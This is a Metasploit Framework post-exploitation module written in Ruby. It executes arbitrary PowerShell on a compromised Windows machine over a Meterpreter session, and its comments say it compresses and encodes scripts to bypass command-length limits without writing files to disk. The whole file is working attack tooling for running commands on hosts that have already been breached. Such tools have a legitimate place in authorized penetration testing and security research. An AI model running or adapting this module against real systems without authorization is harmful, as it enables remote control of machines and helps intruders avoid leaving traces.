##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

##
# Original script comments by nick[at]executionflow.org:
# Meterpreter script to deliver and execute powershell scripts using
# a compression/encoding method based on the powershell PoC code
# from rel1k and winfang98 at DEF CON 18. This script furthers the
# idea by bypassing Windows' command character lmits, allowing the
# execution of very large scripts. No files are ever written to disk.
##
require 'msf/core'
require 'rex'
require 'msf/core/post/windows/powershell'

class Metasploit3 < Msf::Post
  include Msf::Post::Windows::Powershell

  def initialize(info={})
    super(update_info(info,
      'Name'                 => "Powershell: Execute Command",
      'Description'          => %q{
        This module will execute a string of Powershell and return output.
      },
      'License'              => MSF_LICENSE,
      'Platform'             => ['win'],
      'SessionTypes'         => ['meterpreter'],
      'Author'               => [
        'Nicholas Nam (nick[at]executionflow.org)', # original meterpreter script
        'RageLtMan' # post module
        ]
    ))

    register_options(
      [
        OptString.new( 'PSH_CMD',  [true, 'Powershell string to execute', "echo 'metasploited'"]),
      ], self.class)

    register_advanced_options(
      [
        OptString.new('SUBSTITUTIONS', [false, 'Script subs in gsub format - original,sub;original,sub' ]),
      ], self.class)

  end

  def run

    # Make sure we meet the requirements before running the script, note no need to return
    # unless error
    return 0 if ! (session.type == "meterpreter" || have_powershell?)

    # check/set vars
    subs = process_subs(datastore['SUBSTITUTIONS'])
    script_in = read_script(datastore['PSH_CMD'])

    # Make substitutions in script if needed
    script_in = make_subs(script_in, subs) unless subs.empty?
 		print_status(script_in)
    print_status(script_in.dup.compress_code)

    # Execute the powershell script
    print_status('Executing the script.')

    ps_output = psh_exec(script_in)

    print_status ps_output

    # That's it
    print_good('Finished!')
  end

end

